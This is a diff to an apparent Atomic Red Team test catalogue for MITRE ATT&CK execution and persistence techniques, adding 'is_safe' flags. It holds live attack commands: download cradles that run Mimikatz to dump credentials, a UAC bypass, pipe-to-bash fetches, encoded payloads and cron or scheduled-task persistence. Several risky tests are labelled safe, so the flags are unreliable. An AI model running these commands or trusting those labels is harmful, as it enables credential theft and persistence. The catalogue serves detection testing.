@@ -17,38 +17,45 @@
       platform: windows
       command: wmic useraccount get /ALL /format:csv
       timeout: 120
+      is_safe: true
     - name: WMI Reconnaissance Processes
       type: cmd
       platform: windows
       command: wmic process get caption,executablepath,commandline /format:csv
       timeout: 120
+      is_safe: true
     - name: WMI Reconnaissance Software
       type: cmd
       platform: windows
       command: wmic qfe get description,installedOn /format:csv
       timeout: 120
+      is_safe: true
     - name: WMI Reconnaissance List Remote Services
       type: cmd
       platform: windows
       command: wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
       timeout: 120
+      is_safe: true
     - name: WMI Execute Local Process
       type: cmd
       platform: windows
       command: wmic process call create notepad.exe
       cleanup: wmic process where name='notepad.exe' delete >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: WMI Execute Remote Process
       type: cmd
       platform: windows
       command: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process call create notepad.exe
       cleanup: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process where name='notepad.exe' delete >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Create a Process using WMI Query and an Encoded Command
       type: cmd
       platform: windows
       command: powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
       timeout: 120
+      is_safe: true
     - name: Create a Process using obfuscated Win32_Process
       type: powershell
       platform: windows
@@ -62,12 +69,14 @@
         try { $CleanupClass.Delete() } catch {}
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: WMI Execute rundll32
       type: cmd
       platform: windows
       command: wmic /node:127.0.0.1 process call create "rundll32.exe \"PathToAtomicsFolder\..\ExternalPayloads\calc.dll\" StartW"
       cleanup: taskkill /f /im calculator.exe
       timeout: 120
+      is_safe: true
     - name: Application uninstall using WMIC
       type: cmd
       platform: windows
@@ -75,9 +84,10 @@
       cleanup: msiexec /i "PathToAtomicsFolder\..\ExternalPayloads\tightvncinstaller.msi" /qn /norestart
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1047
-  is_safe: false
+  is_safe: true
 - id: T1053.002
   name: At
   description: Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments...
@@ -96,14 +106,16 @@
       platform: windows
       command: at 13:20 /interactive cmd
       timeout: 120
+      is_safe: true
     - name: At - Schedule a job
       type: sh
       platform: linux
       command: echo "echo Hello from Atomic Red Team" | at now + 1 minute
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1053/002
-  is_safe: false
+  is_safe: true
 - id: T1053.003
   name: Cron
   description: |-
@@ -127,6 +139,7 @@
         echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
       cleanup: crontab /tmp/notevil
       timeout: 60
+      is_safe: true
     - name: Cron - Replace crontab with referenced file
       type: sh
       platform: macos
@@ -135,6 +148,7 @@
         echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
       cleanup: crontab /tmp/notevil
       timeout: 60
+      is_safe: true
     - name: Cron - Add script to all cron subfolders
       type: bash
       platform: macos
@@ -150,6 +164,7 @@
         rm /etc/cron.weekly/persistevil -f
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Cron - Add script to all cron subfolders
       type: bash
       platform: linux
@@ -165,6 +180,7 @@
         rm /etc/cron.weekly/persistevil -f
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Cron - Add script to /etc/cron.d folder
       type: sh
       platform: linux
@@ -172,6 +188,7 @@
       cleanup: rm /etc/cron.d/persistevil -f
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Cron - Add script to /var/spool/cron/crontabs/ folder
       type: bash
       platform: linux
@@ -179,9 +196,10 @@
       cleanup: rm /var/spool/cron/crontabs/persistevil -f
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1053/003
-  is_safe: false
+  is_safe: true
 - id: T1053.005
   name: Scheduled Task
   description: 'Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the W...'
@@ -204,12 +222,14 @@
         schtasks /delete /tn "T1053_005_OnStartup" /f >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Scheduled task Local
       type: cmd
       platform: windows
       command: SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
       cleanup: SCHTASKS /Delete /TN spawn /F >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Scheduled task Remote
       type: cmd
       platform: windows
@@ -217,6 +237,7 @@
       cleanup: SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN "Atomic task" /F >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Powershell Cmdlet Scheduled Task
       type: powershell
       platform: windows
@@ -229,12 +250,14 @@
         Register-ScheduledTask AtomicTask -InputObject $object
       cleanup: Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false >$null 2>&1
       timeout: 120
+      is_safe: true
     - name: Task Scheduler via VBA
       type: powershell
       platform: windows
       command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\""
       cleanup: Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
       timeout: 120
+      is_safe: true
     - name: WMI Invoke-CimMethod Scheduled Task
       type: powershell
       platform: windows
@@ -244,6 +267,7 @@
       cleanup: Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false >$null 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Scheduled Task Executing Base64 Encoded Commands From Registry
       type: cmd
       platform: windows
@@ -254,6 +278,7 @@
         schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
         reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Import XML Schedule Task with Hidden Attribute
       type: powershell
       platform: windows
@@ -263,6 +288,7 @@
       cleanup: Unregister-ScheduledTask -TaskName "atomic red team" -confirm:$false >$null 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: PowerShell Modify A Scheduled Task
       type: powershell
       platform: windows
@@ -277,6 +303,7 @@
         Set-ScheduledTask "AtomicTaskModifed" -Action $NewAction
       cleanup: Unregister-ScheduledTask -TaskName "AtomicTaskModifed" -confirm:$false >$null 2>&1
       timeout: 120
+      is_safe: true
     - name: Scheduled Task ("Ghost Task") via Registry Key Manipulation
       type: cmd
       platform: windows
@@ -288,6 +315,7 @@
         "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\localhost delete lilghostie > nul
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Scheduled Task Persistence via CompMgmt.msc
       type: cmd
       platform: windows
@@ -301,6 +329,7 @@
         schtasks /Delete /TN "CompMgmtBypass" /F
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Scheduled Task Persistence via Eventviewer.msc
       type: cmd
       platform: windows
@@ -314,9 +343,10 @@
         schtasks /Delete /TN "EventViewerBypass" /F
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1053/005
-  is_safe: false
+  is_safe: true
 - id: T1053.006
   name: Systemd Timers
   description: 'Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated r...'
@@ -358,6 +388,7 @@
         systemctl daemon-reload
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Create a user level transient systemd service and timer
       type: sh
       platform: linux
@@ -367,6 +398,7 @@
         systemctl --user stop Atomic-Red-Team.timer
         rm /tmp/log
       timeout: 60
+      is_safe: true
     - name: Create a system level transient systemd service and timer
       type: sh
       platform: linux
@@ -377,9 +409,10 @@
         rm /tmp/log
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1053/006
-  is_safe: false
+  is_safe: true
 - id: T1059
   name: Command and Scripting Interpreter
   description: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows C...
@@ -394,9 +427,10 @@
       platform: windows
       command: Start-Process -FilePath "C:\Program Files (x86)\AutoIt3\AutoIt3.exe" -ArgumentList "PathToAtomicsFolder\T1059\src\calc.au3"
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059
-  is_safe: false
+  is_safe: true
 - id: T1059.001
   name: PowerShell
   description: 'Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a co...'
@@ -410,6 +444,7 @@
       command: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Run BloodHound from local disk
       type: powershell
       platform: windows
@@ -420,6 +455,7 @@
         Start-Sleep 5
       cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
       timeout: 120
+      is_safe: true
     - name: Run Bloodhound from Memory using Download Cradle
       type: powershell
       platform: windows
@@ -430,32 +466,38 @@
         Start-Sleep 5
       cleanup: Remove-Item $env:Temp\*BloodHound.zip -Force
       timeout: 120
+      is_safe: true
     - name: Mimikatz - Cradlecraft PsSendKeys
       type: powershell
       platform: windows
       command: $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: Invoke-AppPathBypass
       type: cmd
       platform: windows
       command: Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
       timeout: 120
+      is_safe: true
     - name: Powershell MsXml COM object - with prompt
       type: cmd
       platform: windows
       command: powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
       timeout: 120
+      is_safe: true
     - name: Powershell XML requests
       type: cmd
       platform: windows
       command: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml'');$Xml.command.a.execute | IEX"'
       timeout: 120
+      is_safe: true
     - name: Powershell invoke mshta.exe download
       type: cmd
       platform: windows
       command: C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
       timeout: 120
+      is_safe: true
     - name: PowerShell Fileless Script Execution
       type: powershell
       platform: windows
@@ -467,6 +509,7 @@
         Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
         Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: NTFS Alternate Data Stream Access
       type: powershell
       platform: windows
@@ -476,6 +519,7 @@
         Invoke-Expression $streamcommand
       cleanup: Remove-Item $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: PowerShell Session Creation and Use
       type: powershell
       platform: windows
@@ -487,31 +531,37 @@
         Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: ATHPowerShellCommandLineParameter -Command parameter variations
       type: powershell
       platform: windows
       command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop
       timeout: 120
+      is_safe: true
     - name: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments
       type: powershell
       platform: windows
       command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop
       timeout: 120
+      is_safe: true
     - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations
       type: powershell
       platform: windows
       command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop
       timeout: 120
+      is_safe: true
     - name: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments
       type: powershell
       platform: windows
       command: Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop
       timeout: 120
+      is_safe: true
     - name: PowerShell Command Execution
       type: cmd
       platform: windows
       command: powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
       timeout: 120
+      is_safe: true
     - name: PowerShell Invoke Known Malicious Cmdlets
       type: powershell
       platform: windows
@@ -524,6 +574,7 @@
             $cmdlets}
       timeout: 120
       elevation_required: true
+      is_safe: false
     - name: PowerUp Invoke-AllChecks
       type: powershell
       platform: windows
@@ -532,6 +583,7 @@
         iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
         Invoke-AllChecks
       timeout: 120
+      is_safe: true
     - name: Abuse Nslookup with DNS Records
       type: powershell
       platform: windows
@@ -541,19 +593,22 @@
         function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
         powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
       timeout: 120
+      is_safe: true
     - name: SOAPHound - Dump BloodHound Data
       type: powershell
       platform: windows
       command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2
       timeout: 120
+      is_safe: true
     - name: SOAPHound - Build Cache
       type: powershell
       platform: windows
       command: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/001
-  is_safe: false
+  is_safe: true
 - id: T1059.002
   name: AppleScript
   description: |-
@@ -569,9 +624,10 @@
       platform: macos
       command: osascript -e "do shell script \"echo \\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\" | python &\""
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/002
-  is_safe: false
+  is_safe: true
 - id: T1059.003
   name: Windows Command Shell
   description: Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/technique...
@@ -585,28 +641,33 @@
       command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat"
       cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\T1059.003_script.bat" -Force -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Writes text to a file and displays it.
       type: cmd
       platform: windows
       command: echo "Hello from the Windows Command Prompt!" > "%TEMP%\test.bin" & type "%TEMP%\test.bin"
       cleanup: del "%TEMP%\test.bin" >nul 2>&1
       timeout: 120
+      is_safe: true
     - name: Suspicious Execution via Windows Command Shell
       type: cmd
       platform: windows
       command: '%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt'
       timeout: 120
+      is_safe: true
     - name: Simulate BlackByte Ransomware Print Bombing
       type: powershell
       platform: windows
       command: cmd /c "for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\..\ExternalPayloads\T1059_003note.txt" | out-null
       cleanup: stop-process -name wordpad -force -erroraction silentlycontinue
       timeout: 120
+      is_safe: true
     - name: Command Prompt read contents from CMD file and execute
       type: cmd
       platform: windows
       command: cmd /r cmd<"PathToAtomicsFolder\T1059.003\src\t1059.003_cmd.cmd"
       timeout: 120
+      is_safe: true
     - name: Command prompt writing script to file then executes it
       type: cmd
       platform: windows
@@ -614,9 +675,10 @@
       cleanup: del "AtomicTest.vbs" >nul 2>&1
       timeout: 120
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1059/003
-  is_safe: false
+  is_safe: true
 - id: T1059.004
   name: Unix Shell
   description: |-
@@ -638,6 +700,7 @@
         sh /tmp/art.sh
       cleanup: rm /tmp/art.sh
       timeout: 60
+      is_safe: true
     - name: Create and Execute Bash Shell Script
       type: sh
       platform: macos
@@ -648,6 +711,7 @@
         sh /tmp/art.sh
       cleanup: rm /tmp/art.sh
       timeout: 60
+      is_safe: true
     - name: Command-Line Interface
       type: sh
       platform: linux
@@ -656,6 +720,7 @@
         wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
       cleanup: rm /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Command-Line Interface
       type: sh
       platform: macos
@@ -664,6 +729,7 @@
         wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
       cleanup: rm /tmp/art-fish.txt
       timeout: 60
+      is_safe: true
     - name: Harvest SUID executable files
       type: sh
       platform: linux
@@ -672,6 +738,7 @@
         bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
       cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
       timeout: 60
+      is_safe: true
     - name: LinEnum tool execution
       type: sh
       platform: linux
@@ -680,6 +747,7 @@
         bash PathToAtomicsFolder/T1059.004/src/LinEnum.sh
       cleanup: rm -rf PathToAtomicsFolder/T1059.004/src/LinEnum.sh
       timeout: 60
+      is_safe: true
     - name: New script file in the tmp directory
       type: sh
       platform: linux
@@ -691,6 +759,7 @@
         rm $TMPFILE
         unset TMPFILE
       timeout: 60
+      is_safe: true
     - name: What shell is running
       type: sh
       platform: linux
@@ -699,16 +768,19 @@
         if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi
         if $(printenv SHELL >/dev/null); then printenv SHELL; fi
       timeout: 60
+      is_safe: true
     - name: What shells are available
       type: sh
       platform: linux
       command: cat /etc/shells
       timeout: 60
+      is_safe: true
     - name: Command line scripts
       type: sh
       platform: linux
       command: for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
       timeout: 60
+      is_safe: true
     - name: Obfuscated command line scripts
       type: sh
       platform: linux
@@ -719,6 +791,7 @@
         echo -n "$ART" | $decodecmd |/bin/bash
         unset ART
       timeout: 60
+      is_safe: true
     - name: Change login shell
       type: bash
       platform: linux
@@ -730,6 +803,7 @@
       cleanup: '[ "$(uname)" = ''FreeBSD'' ] && rmuser -y art || userdel art'
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: Environment variable scripts
       type: sh
       platform: linux
@@ -738,6 +812,7 @@
         echo $ART |/bin/sh
       cleanup: unset ART
       timeout: 60
+      is_safe: true
     - name: Detecting pipe-to-shell
       type: sh
       platform: linux
@@ -747,51 +822,60 @@
         ls -la /tmp/art.txt
       cleanup: rm /tmp/art.txt
       timeout: 60
+      is_safe: true
     - name: Current kernel information enumeration
       type: sh
       platform: linux
       command: uname -srm
       timeout: 60
+      is_safe: true
     - name: Shell Creation using awk command
       type: sh
       platform: linux
       command: awk 'BEGIN {system("/bin/sh &")}'
       timeout: 60
+      is_safe: true
     - name: Shell Creation using awk command
       type: sh
       platform: macos
       command: awk 'BEGIN {system("/bin/sh &")}'
       timeout: 60
+      is_safe: true
     - name: Creating shell using cpan command
       type: sh
       platform: linux
       command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
       timeout: 60
+      is_safe: true
     - name: Creating shell using cpan command
       type: sh
       platform: macos
       command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
       timeout: 60
+      is_safe: true
     - name: Shell Creation using busybox command
       type: sh
       platform: linux
       command: busybox sh &
       timeout: 60
+      is_safe: true
     - name: emacs spawning an interactive system shell
       type: sh
       platform: linux
       command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
       timeout: 60
       elevation_required: true
+      is_safe: false
     - name: emacs spawning an interactive system shell
       type: sh
       platform: macos
       command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
       timeout: 60
       elevation_required: true
+      is_safe: false
   references:
     - https://attack.mitre.org/techniques/T1059/004
-  is_safe: false
+  is_safe: true
 - id: T1059.005
   name: Visual Basic
   description: 'Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(C...'
@@ -807,6 +891,7 @@
       command: cscript "PathToAtomicsFolder\T1059.005\src\sys_info.vbs" > $env:TEMP\T1059.005.out.txt
       cleanup: Remove-Item $env:TEMP\T1059.005.out.txt -ErrorAction Ignore
       timeout: 120
+      is_safe: true
     - name: Encoded VBS code execution
       type: powershell
       platform: windows
@@ -816,15 +901,17 @@
         Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
       cleanup: Get-WmiObject win32_process | Where-Object {$_.CommandLine -like "*mshta*"}  | % { "$(Stop-Process $_.ProcessID)" } | Out-Null
       timeout: 120
+      is_safe: true
     - name: Extract Memory via VBA
       type: powershell
       platform: windows
       command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
       cleanup: Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
       timeout: 120
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/005
-  is_safe: false
+  is_safe: true
 - id: T1059.006
   name: Python
   description: |-
@@ -845,6 +932,7 @@
         $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
       cleanup: "rm T1059.006-payload \npip-autoremove pypykatz >nul 2> nul"
       timeout: 60
+      is_safe: true
     - name: Execute Python via scripts
       type: sh
       platform: linux
@@ -863,6 +951,7 @@
         $which_python T1059.006.py
       cleanup: rm T1059.006.py T1059.006-payload
       timeout: 60
+      is_safe: true
     - name: Execute Python via Python executables
       type: sh
       platform: linux
@@ -882,6 +971,7 @@
         $which_python T1059.006.pyc
       cleanup: rm T1059.006.pyc T1059.006.py T1059.006-payload
       timeout: 60
+      is_safe: true
     - name: Python pty module and spawn function used to spawn sh or bash
       type: sh
       platform: linux
@@ -892,9 +982,10 @@
         $which_python -c "import pty;pty.spawn('/bin/bash')"
         exit
       timeout: 60
+      is_safe: true
   references:
     - https://attack.mitre.org/techniques/T1059/006
-  is_safe: false
+  is_safe: true
 - id: T1059.007
   name: JavaScript
   description: |-
@@ -913,14 +1004,16 @@
